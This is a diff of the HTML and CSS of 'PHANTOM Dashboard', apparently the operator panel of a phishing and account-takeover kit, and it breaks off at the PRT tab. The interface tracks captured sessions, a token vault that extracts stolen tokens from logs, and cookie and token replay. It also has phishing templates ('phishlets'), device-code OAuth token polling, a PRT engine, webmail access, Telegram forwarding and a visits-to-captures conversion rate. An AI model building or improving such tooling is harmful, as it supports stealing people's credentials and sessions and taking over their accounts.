@@ -1,1261 +1,758 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PHANTOM Dashboard</title>
-    <!-- Leaflet CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <!-- Chart.js -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
-        /* ── Same styles as before (unchanged) ── */
-        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap');
+        :root {
+            --bg: #0a0a0f;
+            --card: #12121a;
+            --border: #1e1e2e;
+            --text: #cdd6f4;
+            --muted: #6c7086;
+            --accent: #cba6f7;
+            --green: #a6e3a1;
+            --red: #f38ba8;
+            --orange: #fab387;
+            --blue: #89b4fa;
+            --gold: #f9e2af;
+            --radius: 12px;
+            --shadow: 0 4px 24px rgba(0,0,0,0.4);
+        }
+        [data-theme="light"] {
+            --bg: #f5f5f9;
+            --card: #ffffff;
+            --border: #d0d0da;
+            --text: #1e1e2e;
+            --muted: #585b70;
+            --accent: #8839ef;
+            --green: #40a02b;
+            --red: #d20f39;
+            --orange: #fe640b;
+            --blue: #1e66f5;
+            --gold: #df8e1d;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', sans-serif;
-            background: radial-gradient(circle at 20% 30%, #0a0e17, #030507);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
             min-height: 100vh;
-            padding: 24px;
-            color: #e0e8f0;
-            transition: background 0.4s ease, color 0.4s ease;
+            transition: all 0.3s ease;
         }
-        .glass {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(16px) saturate(180%);
-            -webkit-backdrop-filter: blur(16px) saturate(180%);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 24px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.03);
-            transition: background 0.4s ease, border 0.4s ease, box-shadow 0.4s ease;
+        .sidebar {
+            position: fixed;
+            left: 0; top: 0; bottom: 0;
+            width: 240px;
+            background: var(--card);
+            border-right: 1px solid var(--border);
+            padding: 20px 0;
+            z-index: 100;
+            overflow-y: auto;
         }
-        .container { max-width: 1440px; margin: 0 auto; }
-        body.light-glass { background: radial-gradient(circle at 20% 30%, #e8edf5, #d0d8e5); color: #1a1f2a; }
-        body.light-glass .glass { background: rgba(255, 255, 255, 0.25); backdrop-filter: blur(20px) saturate(180%); border: 1px solid rgba(255, 255, 255, 0.35); box-shadow: 0 8px 32px rgba(0,0,0,0.08), inset 0 0 0 1px rgba(255,255,255,0.2); }
-        body.light-glass .header h1 { background: linear-gradient(135deg, #4a2c8a, #2a5f8a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        body.light-glass .stat-card .value { background: linear-gradient(135deg, #1a1f2a, #3a4f6a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        body.light-glass .stat-card label, body.light-glass .stat-card .sub { color: rgba(0,0,0,0.6); }
-        body.light-glass .badge { background: rgba(0,0,0,0.08); color: #1a1f2a; border-color: rgba(0,0,0,0.1); }
-        body.light-glass .action-btn { color: #1a1f2a; border-color: rgba(0,0,0,0.15); }
-        body.light-glass .action-btn:hover { background: rgba(0,0,0,0.06); }
-        body.light-glass .toolbar input, body.light-glass .toolbar select { background: rgba(255,255,255,0.3); border-color: rgba(0,0,0,0.1); color: #1a1f2a; }
-        body.light-glass .toolbar input::placeholder { color: rgba(0,0,0,0.4); }
-        body.light-glass .toolbar input:focus, body.light-glass .toolbar select:focus { border-color: #7c4dff; box-shadow: 0 0 0 3px rgba(124,77,255,0.2); }
-        body.light-glass .btn { color: #1a1f2a; border-color: rgba(0,0,0,0.1); background: rgba(255,255,255,0.2); }
-        body.light-glass .btn:hover { background: rgba(255,255,255,0.4); }
-        body.light-glass .btn-primary { background: linear-gradient(135deg, #536dfe, #7c4dff); color: #fff; border-color: transparent; }
-        body.light-glass .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); }
-        body.light-glass .modal-content { background: rgba(255,255,255,0.3); backdrop-filter: blur(20px); border-color: rgba(255,255,255,0.4); }
-        body.light-glass .modal pre { background: rgba(0,0,0,0.05); border-color: rgba(0,0,0,0.1); }
-        body.light-glass .toast { background: rgba(255,255,255,0.9); color: #1a1f2a; border-color: rgba(0,0,0,0.1); }
-        body.light-glass .ws-dot.online { background: #2b8c3e; box-shadow: 0 0 12px #2b8c3e; }
-        body.light-glass .ws-dot.offline { background: #c92a2a; box-shadow: 0 0 12px #c92a2a; }
-
-        .tabs { display: flex; gap: 4px; padding: 4px; margin-bottom: 24px; overflow-x: auto; }
-        .tab { padding: 10px 24px; border-radius: 40px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); color: rgba(255,255,255,0.5); white-space: nowrap; }
-        .tab:hover { background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.8); }
-        .tab.active { background: rgba(124,77,255,0.2); border-color: rgba(124,77,255,0.3); color: #b388ff; }
-        body.light-glass .tab { color: rgba(0,0,0,0.4); background: rgba(0,0,0,0.02); border-color: rgba(0,0,0,0.05); }
-        body.light-glass .tab:hover { color: rgba(0,0,0,0.7); }
-        body.light-glass .tab.active { background: rgba(124,77,255,0.15); border-color: rgba(124,77,255,0.2); color: #4a2c8a; }
-
+        .sidebar .logo {
+            padding: 0 20px 20px;
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 10px;
+        }
+        .sidebar .logo span { color: var(--accent); }
+        .sidebar nav a {
+            display: flex; align-items: center; gap: 10px;
+            padding: 12px 20px;
+            color: var(--muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+            border-left: 3px solid transparent;
+        }
+        .sidebar nav a:hover, .sidebar nav a.active {
+            color: var(--text);
+            background: var(--bg);
+            border-left-color: var(--accent);
+        }
+        .sidebar nav a .icon { font-size: 18px; width: 24px; text-align: center; }
+        .main {
+            margin-left: 240px;
+            padding: 30px;
+        }
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .header h1 { font-size: 28px; font-weight: 700; }
+        .header-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            background: var(--card);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 16px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            text-decoration: none;
+        }
+        .btn:hover { opacity: 0.85; transform: scale(1.02); }
+        .btn-primary { background: var(--accent); color: #000; border-color: transparent; }
+        .btn-gold { background: transparent; border-color: var(--gold); color: var(--gold); }
+        .btn-gold:hover { background: rgba(249,226,175,0.1); }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 16px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+            box-shadow: var(--shadow);
+            transition: transform 0.2s;
+        }
+        .stat-card:hover { transform: translateY(-2px); }
+        .stat-card .label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+        .stat-card .value { font-size: 32px; font-weight: 700; }
+        .stat-card .sub { font-size: 12px; color: var(--muted); margin-top: 4px; }
+        .value.green { color: var(--green); }
+        .value.accent { color: var(--accent); }
+        .value.orange { color: var(--orange); }
+        .panel {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
+        }
+        .panel h3 { margin-bottom: 15px; font-size: 16px; font-weight: 600; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th { text-align: left; padding: 10px 8px; border-bottom: 2px solid var(--border); color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
+        td { padding: 10px 8px; border-bottom: 1px solid var(--border); }
+        .badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .badge.enabled { background: rgba(166,227,161,0.15); color: var(--green); }
+        .badge.disabled { background: rgba(243,139,168,0.15); color: var(--red); }
+        .btn-sm { padding: 4px 10px; font-size: 11px; border-radius: 30px; }
+        .hidden { display: none !important; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-
-        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; padding: 20px 28px; margin-bottom: 28px; }
-        .header h1 { font-weight: 700; font-size: 26px; background: linear-gradient(135deg, #b388ff, #82b1ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; letter-spacing: -0.5px; }
-        .header-actions { display: flex; gap: 12px; align-items: center; }
-
-        .btn { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.12); color: #e0e8f0; padding: 8px 18px; border-radius: 40px; font-weight: 500; font-size: 13px; cursor: pointer; transition: all 0.2s; backdrop-filter: blur(4px); display: inline-flex; align-items: center; gap: 6px; }
-        .btn:hover { background: rgba(255,255,255,0.14); border-color: rgba(255,255,255,0.25); box-shadow: 0 0 20px rgba(130,177,255,0.15); }
-        .btn-primary { background: linear-gradient(135deg, #536dfe, #7c4dff); border-color: transparent; color: #fff; box-shadow: 0 4px 15px rgba(83,109,254,0.3); }
-        .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); box-shadow: 0 4px 25px rgba(83,109,254,0.5); border-color: transparent; }
-        .btn-success { background: linear-gradient(135deg, #00c853, #00e676); border-color: transparent; color: #fff; }
-        .btn-success:hover { background: linear-gradient(135deg, #00e676, #69f0ae); }
-        .btn-danger { background: linear-gradient(135deg, #d50000, #ff1744); border-color: transparent; color: #fff; }
-        .btn-danger:hover { background: linear-gradient(135deg, #ff1744, #ff5252); }
-        .btn-warning { background: linear-gradient(135deg, #ff6d00, #ff9100); border-color: transparent; color: #fff; }
-        .btn-warning:hover { background: linear-gradient(135deg, #ff9100, #ffab40); }
-        .btn-sm { padding: 4px 12px; font-size: 11px; border-radius: 30px; }
-
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; margin-bottom: 28px; }
-        .stat-card { padding: 18px 22px; display: flex; flex-direction: column; }
-        .stat-card label { font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; color: rgba(255,255,255,0.5); margin-bottom: 4px; }
-        .stat-card .value { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, #f0f4ff, #b0c4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        .stat-card .sub { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 4px; }
-
-        .toolbar { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; padding: 16px 24px; margin-bottom: 24px; }
-        .toolbar input, .toolbar select { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 40px; padding: 8px 18px; color: #e0e8f0; font-size: 13px; outline: none; transition: 0.2s; backdrop-filter: blur(4px); }
-        .toolbar input:focus, .toolbar select:focus { border-color: #7c4dff; box-shadow: 0 0 0 3px rgba(124,77,255,0.2); }
-        .toolbar input::placeholder { color: rgba(255,255,255,0.3); }
-        .toolbar select option { background: #1a1f2a; color: #e0e8f0; }
-
-        .ws-status { margin-left: auto; font-size: 13px; display: flex; align-items: center; gap: 6px; }
-        .ws-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
-        .ws-dot.online { background: #69db7c; box-shadow: 0 0 12px #69db7c; }
-        .ws-dot.offline { background: #ff6b6b; box-shadow: 0 0 12px #ff6b6b; }
-
-        .table-wrap { overflow-x: auto; padding: 4px; margin-bottom: 24px; }
-        table { width: 100%; border-collapse: collapse; font-size: 14px; }
-        th { text-align: left; padding: 14px 16px; font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.05em; color: rgba(255,255,255,0.4); border-bottom: 1px solid rgba(255,255,255,0.06); }
-        td { padding: 14px 16px; border-bottom: 1px solid rgba(255,255,255,0.04); color: rgba(255,255,255,0.8); }
-        tr:hover td { background: rgba(255,255,255,0.04); }
-
-        .badge { background: rgba(130,177,255,0.15); padding: 2px 12px; border-radius: 40px; font-size: 12px; color: #82b1ff; border: 1px solid rgba(130,177,255,0.1); display: inline-block; }
-        .badge-success { background: rgba(0,200,83,0.15); color: #69db7c; border-color: rgba(0,200,83,0.2); }
-        .badge-danger { background: rgba(255,23,68,0.15); color: #ff6b6b; border-color: rgba(255,23,68,0.2); }
-        .badge-warning { background: rgba(255,109,0,0.15); color: #ffab40; border-color: rgba(255,109,0,0.2); }
-        .badge-info { background: rgba(33,150,243,0.15); color: #64b5f6; border-color: rgba(33,150,243,0.2); }
-
-        .action-btn { background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #e0e8f0; padding: 4px 12px; border-radius: 30px; font-size: 12px; cursor: pointer; transition: 0.2s; margin-right: 6px; }
-        .action-btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
-        .action-btn.cookie { border-color: rgba(255,215,0,0.2); color: #ffd700; }
-        .action-btn.cookie:hover { background: rgba(255,215,0,0.08); border-color: #ffd700; }
-        .action-btn.replay { border-color: rgba(0,255,200,0.3); color: #00ffc8; }
-        .action-btn.replay:hover { background: rgba(0,255,200,0.1); border-color: #00ffc8; box-shadow: 0 0 20px rgba(0,255,200,0.2); }
-        .action-btn.token { border-color: rgba(255,215,0,0.2); color: #ffd700; }
-        .action-btn.token:hover { background: rgba(255,215,0,0.08); border-color: #ffd700; }
-
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
-        .map-container { height: 300px; border-radius: 20px; overflow: hidden; background: rgba(0,0,0,0.3); }
-        #map { height: 100%; width: 100%; background: transparent; }
-        .chart-container { height: 300px; padding: 16px; }
-        .chart-container canvas { width: 100% !important; height: 100% !important; }
-
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(12px); z-index: 2000; justify-content: center; align-items: center; }
-        .modal-content { max-width: 800px; width: 90%; max-height: 80vh; padding: 28px; overflow-y: auto; position: relative; }
-        .modal-close { position: sticky; top: 0; float: right; background: rgba(255,107,107,0.15); border: 1px solid rgba(255,107,107,0.2); color: #ff6b6b; padding: 6px 16px; border-radius: 40px; cursor: pointer; font-weight: 500; transition: 0.2s; }
-        .modal-close:hover { background: rgba(255,107,107,0.25); }
-        .modal pre { background: rgba(0,0,0,0.3); padding: 16px; border-radius: 12px; overflow-x: auto; font-size: 12px; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgba(255,255,255,0.05); }
-
-        .toast { position: fixed; bottom: 24px; right: 24px; background: rgba(0,0,0,0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); color: #e0e8f0; padding: 14px 24px; border-radius: 40px; box-shadow: 0 8px 32px rgba(0,0,0,0.6); z-index: 3000; animation: slideUp 0.3s ease; }
-        .toast.error { border-color: rgba(255,107,107,0.3); }
-        @keyframes slideUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
-
-        .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
-        .switch input { opacity:0; width:0; height:0; }
-        .slider { position: absolute; cursor: pointer; top:0; left:0; right:0; bottom:0; background-color:rgba(255,255,255,0.1); transition:.3s; border-radius:34px; }
-        .slider:before { position: absolute; content:""; height:18px; width:18px; left:3px; bottom:3px; background-color:rgba(255,255,255,0.3); transition:.3s; border-radius:50%; }
-        input:checked + .slider { background-color:#7c4dff; }
-        input:checked + .slider:before { transform:translateX(20px); background-color:white; }
-
-        @media (max-width:768px) { .grid-2 { grid-template-columns:1fr; } .header { flex-direction:column; align-items:stretch; } .toolbar { flex-direction:column; align-items:stretch; } .ws-status { margin-left:0; justify-content:flex-end; } .tabs { gap:2px; } .tab { padding:6px 14px; font-size:12px; } }
-        .leaflet-control-zoom a { background:rgba(255,255,255,0.08) !important; color:#e0e8f0 !important; border-color:rgba(255,255,255,0.1) !important; }
-        .leaflet-popup-content-wrapper { background:rgba(20,25,35,0.9) !important; backdrop-filter:blur(12px) !important; color:#e0e8f0 !important; border:1px solid rgba(255,255,255,0.05) !important; }
-        body.light-glass .leaflet-control-zoom a { background:rgba(255,255,255,0.3) !important; color:#1a1f2a !important; border-color:rgba(0,0,0,0.1) !important; }
-        body.light-glass .leaflet-popup-content-wrapper { background:rgba(255,255,255,0.9) !important; color:#1a1f2a !important; border-color:rgba(0,0,0,0.1) !important; }
+        .toast {
+            position: fixed; bottom: 20px; right: 20px;
+            background: var(--green); color: #000;
+            padding: 12px 20px; border-radius: 8px;
+            font-weight: 600; z-index: 9999;
+            opacity: 0; transform: translateY(20px);
+            transition: all 0.3s ease;
+        }
+        .toast.show { opacity: 1; transform: translateY(0); }
+        .toast.error { background: var(--red); color: #fff; }
+        .loading { text-align: center; padding: 40px; color: var(--muted); }
+        .loading::after { content: '...'; animation: dots 1.5s infinite; }
+        @keyframes dots { 0%,20% { content: '.'; } 40% { content: '..'; } 60%,100% { content: '...'; } }
+        textarea { width: 100%; height: 120px; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 10px; border-radius: 8px; font-family: monospace; font-size: 12px; resize: vertical; }
+        input, select { background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 8px 12px; border-radius: 6px; font-size: 13px; width: 100%; margin-bottom: 8px; }
+        .flex-row { display: flex; gap: 10px; flex-wrap: wrap; }
+        .flex-row > * { flex: 1; min-width: 150px; }
+        @media (max-width: 768px) {
+            .sidebar { width: 60px; }
+            .sidebar .logo { font-size: 0; padding: 10px; }
+            .sidebar nav a span:not(.icon) { display: none; }
+            .main { margin-left: 60px; padding: 15px; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .header { flex-direction: column; align-items: stretch; }
+            .header-actions { justify-content: flex-start; }
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <header class="header glass">
-        <h1>😈 PHANTOM</h1>
-        <div class="header-actions">
-            <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
-            <button class="btn btn-primary" onclick="exportAll()">📦 Export ZIP</button>
-        </div>
-    </header>
+    <aside class="sidebar">
+        <div class="logo">😈 <span>PHANTOM</span></div>
+        <nav>
+            <a href="#" data-tab="dashboard" class="active"><span class="icon">📊</span> Dashboard</a>
+            <a href="#" data-tab="sessions"><span class="icon">📋</span> Sessions</a>
+            <a href="#" data-tab="vault"><span class="icon">🏛️</span> Token Vault</a>
+            <a href="#" data-tab="analytics"><span class="icon">📈</span> Analytics</a>
+            <a href="#" data-tab="device"><span class="icon">📱</span> Device Code</a>
+            <a href="#" data-tab="prt"><span class="icon">🔐</span> PRT Engine</a>
+            <a href="#" data-tab="recon"><span class="icon">🔍</span> Recon</a>
+            <a href="#" data-tab="webmail"><span class="icon">📧</span> Webmail</a>
+        </nav>
+    </aside>
 
-    <!-- Stats -->
-    <div class="stats">
-        <div class="stat-card glass">
-            <label>Total Sessions</label>
-            <div class="value" id="total">0</div>
-            <div class="sub">Captured</div>
-        </div>
-        <div class="stat-card glass">
-            <label>Last Capture</label>
-            <div class="value" id="last">Never</div>
-            <div class="sub">Latest session</div>
-        </div>
-        <div class="stat-card glass">
-            <label>Status</label>
-            <div class="value" id="status">✅ Online</div>
-            <div class="sub">System ready</div>
-        </div>
-    </div>
-
-    <div class="stats">
-        <div class="stat-card glass">
-            <label>Total Visits</label>
-            <div class="value" id="totalVisits">0</div>
-            <div class="sub">All time</div>
-        </div>
-        <div class="stat-card glass">
-            <label>Unique IPs</label>
-            <div class="value" id="uniqueIPs">0</div>
-            <div class="sub">Unique visitors</div>
-        </div>
-        <div class="stat-card glass">
-            <label>Today</label>
-            <div class="value" id="todayVisits">0</div>
-            <div class="sub">Last 24 hours</div>
-        </div>
-    </div>
-
-    <!-- Tabs -->
-    <div class="tabs glass">
-        <div class="tab active" data-tab="dashboard" onclick="switchTab('dashboard')">📊 Dashboard</div>
-        <div class="tab" data-tab="vault" onclick="switchTab('vault')">🏛️ Token Vault</div>
-        <div class="tab" data-tab="analytics" onclick="switchTab('analytics')">📈 Analytics</div>
-        <div class="tab" data-tab="phishlets" onclick="switchTab('phishlets')">🎭 Phishlets</div>
-        <div class="tab" data-tab="device" onclick="switchTab('device')">📱 Device Code</div>
-        <div class="tab" data-tab="prt" onclick="switchTab('prt')">🔐 PRT</div>
-        <div class="tab" data-tab="recon" onclick="switchTab('recon')">🔍 Recon</div>
-        <div class="tab" data-tab="webmail" onclick="switchTab('webmail')">📧 Webmail</div>
-    </div>
-
-    <!-- ==================== TAB: Dashboard ==================== -->
-    <div id="tab-dashboard" class="tab-content active">
-        <div class="toolbar glass">
-            <label for="searchInput" style="display:none;">Search</label>
-            <input type="text" id="searchInput" placeholder="Search by username, IP, domain..." oninput="filterTable()">
-            <label for="filterDate" style="display:none;">Filter</label>
-            <select id="filterDate" onchange="filterTable()">
-                <option value="all">All Time</option>
-                <option value="today">Today</option>
-                <option value="week">This Week</option>
-            </select>
-            <button class="btn" onclick="refreshLogs()">🔄 Refresh</button>
-            <div class="ws-status">
-                <span class="ws-dot offline" id="wsDot"></span>
-                <span id="wsLabel">Connecting...</span>
+    <main class="main">
+        <div class="header">
+            <h1 id="pageTitle">📊 Dashboard</h1>
+            <div class="header-actions">
+                <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
+                <button class="btn btn-gold" onclick="window.open('/device','_blank')">📱 Device Code</button>
             </div>
         </div>
 
-        <div class="table-wrap glass" style="padding:8px;">
-            <table>
-                <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Username</th><th>IP</th><th>Actions</th></tr></thead>
-                <tbody id="logTable"></tbody>
-            </table>
+        <!-- Stats Grid -->
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-card"><div class="label">Total Sessions</div><div class="value accent" id="statSessions">--</div><div class="sub">Captured</div></div>
+            <div class="stat-card"><div class="label">Status</div><div class="value green" id="statStatus">✅ Online</div><div class="sub">System ready</div></div>
+            <div class="stat-card"><div class="label">Total Visits</div><div class="value" id="statVisits">--</div><div class="sub">All time</div></div>
+            <div class="stat-card"><div class="label">Unique IPs</div><div class="value orange" id="statUniqueIPs">--</div><div class="sub">Unique visitors</div></div>
+            <div class="stat-card"><div class="label">Today</div><div class="value" id="statToday">--</div><div class="sub">Last 24 hours</div></div>
         </div>
 
-        <div class="table-wrap glass" style="padding:8px; margin-top:20px;">
-            <div style="display:flex; justify-content:space-between; align-items:center; padding:12px 16px;">
-                <h3 style="color:rgba(255,255,255,0.6); font-weight:400;">📊 Recent Visits</h3>
-                <span style="font-size:12px; color:rgba(255,255,255,0.3);">Live updates</span>
-            </div>
-            <table>
-                <thead><tr><th>Time</th><th>🌍 Country</th><th>IP</th><th>User-Agent</th><th>Referer</th><th>URL</th></tr></thead>
-                <tbody id="visitsTable">
-                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Loading visits...</td></tr>
-                </tbody>
-            </table>
-        </div>
-
-        <div class="grid-2">
-            <div class="map-container glass"><div id="map"></div></div>
-            <div class="chart-container glass"><canvas id="captureChart"></canvas></div>
-        </div>
-    </div>
-
-    <!-- ==================== TAB: Token Vault ==================== -->
-    <div id="tab-vault" class="tab-content">
-        <div class="toolbar glass">
-            <button class="btn btn-primary" onclick="scanVault()">🔍 Scan Logs</button>
-            <button class="btn btn-success" onclick="healthCheckVault()">🩺 Health Check</button>
-            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="vaultStats">Loading...</span>
-        </div>
-        <div class="table-wrap glass" style="padding:8px;">
-            <table>
-                <thead><tr><th>Type</th><th>Username</th><th>File</th><th>Timestamp</th><th>Actions</th></tr></thead>
-                <tbody id="vaultTable">
-                    <tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No tokens in vault. Click "Scan Logs" to extract tokens.</td></tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- ==================== TAB: Analytics ==================== -->
-    <div id="tab-analytics" class="tab-content">
-        <div class="stats" id="analyticsStats">
-            <div class="stat-card glass">
-                <label>Visits</label>
-                <div class="value" id="analyticsVisits">0</div>
-                <div class="sub">Total</div>
-            </div>
-            <div class="stat-card glass">
-                <label>Captures</label>
-                <div class="value" id="analyticsCaptures">0</div>
-                <div class="sub">Total</div>
-            </div>
-            <div class="stat-card glass">
-                <label>Conversion Rate</label>
-                <div class="value" id="analyticsConversion">0%</div>
-                <div class="sub">Visits → Captures</div>
-            </div>
-            <div class="stat-card glass">
-                <label>Unique IPs</label>
-                <div class="value" id="analyticsUniqueIPs">0</div>
-                <div class="sub">Total</div>
-            </div>
-        </div>
-        <div class="grid-2">
-            <div class="chart-container glass">
-                <h4 style="color:rgba(255,255,255,0.5); font-weight:400; margin-bottom:12px;">📊 Daily Captures</h4>
-                <canvas id="analyticsChart"></canvas>
-            </div>
-            <div class="glass" style="padding:16px;">
-                <h4 style="color:rgba(255,255,255,0.5); font-weight:400; margin-bottom:12px;">🏆 Top Domains</h4>
-                <div id="topDomainsList" style="color:rgba(255,255,255,0.6); font-size:14px;"><p style="color:rgba(255,255,255,0.3);">Loading...</p></div>
-                <div style="margin-top:16px;">
-                    <h4 style="color:rgba(255,255,255,0.5); font-weight:400; margin-bottom:12px;">📈 Conversion Rate</h4>
-                    <div id="conversionDetails" style="color:rgba(255,255,255,0.6); font-size:14px;"><p style="color:rgba(255,255,255,0.3);">Loading...</p></div>
+        <!-- DASHBOARD TAB -->
+        <div class="tab-content active" id="tab-dashboard">
+            <div class="panel"><h3>🔄 Quick Actions</h3>
+                <div class="flex-row">
+                    <button class="btn" onclick="refreshAll()">🔄 Refresh All</button>
+                    <button class="btn btn-primary" onclick="exportZip()">📦 Export ZIP</button>
+                    <button class="btn" onclick="testTelegram()">📤 Test Telegram</button>
                 </div>
             </div>
+            <div class="panel"><h3>📋 Recent Sessions</h3><div id="recentSessions"><div class="loading">Loading</div></div></div>
         </div>
-    </div>
 
-    <!-- ==================== TAB: Phishlets ==================== -->
-    <div id="tab-phishlets" class="tab-content">
-        <div class="toolbar glass">
-            <button class="btn btn-primary" onclick="loadPhishlets()">🔄 Refresh</button>
-            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);">Manage phishing templates</span>
+        <!-- SESSIONS TAB -->
+        <div class="tab-content" id="tab-sessions">
+            <div class="panel"><h3>📋 All Sessions</h3><div id="allSessions"><div class="loading">Loading</div></div></div>
         </div>
-        <div class="table-wrap glass" style="padding:8px;">
-            <table>
-                <thead><tr><th>Name</th><th>Icon</th><th>File</th><th>Entry Point</th><th>Status</th><th>Actions</th></tr></thead>
-                <tbody id="phishletsTable"><tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Loading phishlets...</td></tr></tbody>
-            </table>
+
+        <!-- VAULT TAB -->
+        <div class="tab-content" id="tab-vault">
+            <div class="panel">
+                <h3>🏛️ Token Vault</h3>
+                <div class="flex-row" style="margin-bottom:15px">
+                    <button class="btn btn-primary" onclick="scanVault()">🔍 Scan Logs</button>
+                    <button class="btn" onclick="healthCheckVault()">💚 Health Check</button>
+                </div>
+                <div id="vaultStats"></div>
+                <div id="vaultTokens"><div class="loading">Scan logs to see tokens</div></div>
+            </div>
         </div>
-    </div>
 
-    <!-- ==================== TAB: Device Code ==================== -->
-    <div id="tab-device" class="tab-content">
-        <div class="toolbar glass">
-            <button class="btn btn-primary" onclick="requestDeviceCode()">📱 Request Device Code</button>
-            <button class="btn btn-success" onclick="pollDeviceToken()">⏳ Poll Token</button>
-            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);">Device code OAuth flow</span>
+        <!-- ANALYTICS TAB -->
+        <div class="tab-content" id="tab-analytics">
+            <div class="panel"><h3>📈 Analytics</h3><div id="analyticsData"><div class="loading">Loading</div></div></div>
         </div>
-        <div class="table-wrap glass" style="padding:8px;">
-            <table>
-                <thead><tr><th>User Code</th><th>Verification URI</th><th>Status</th><th>Created</th><th>Access Token</th><th>Actions</th></tr></thead>
-                <tbody id="deviceTable">
-                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No device flows. Request one.</td></tr>
-                </tbody>
-            </table>
+
+        <!-- DEVICE CODE TAB -->
+        <div class="tab-content" id="tab-device">
+            <div class="panel">
+                <h3>📱 Device Code Authentication</h3>
+                <div class="flex-row" style="margin-bottom:15px">
+                    <button class="btn btn-primary" onclick="window.open('/device','_blank')">🚀 Open Device Page</button>
+                    <button class="btn" onclick="requestDeviceCode()">🔑 Request Code</button>
+                    <button class="btn" onclick="loadDeviceHistory()">📋 History</button>
+                </div>
+                <div id="deviceResult"></div>
+                <div id="deviceHistory"></div>
+            </div>
         </div>
-    </div>
 
-    <!-- ==================== TAB: PRT ==================== -->
-    <div id="tab-prt" class="tab-content">
-        <div class="toolbar glass">
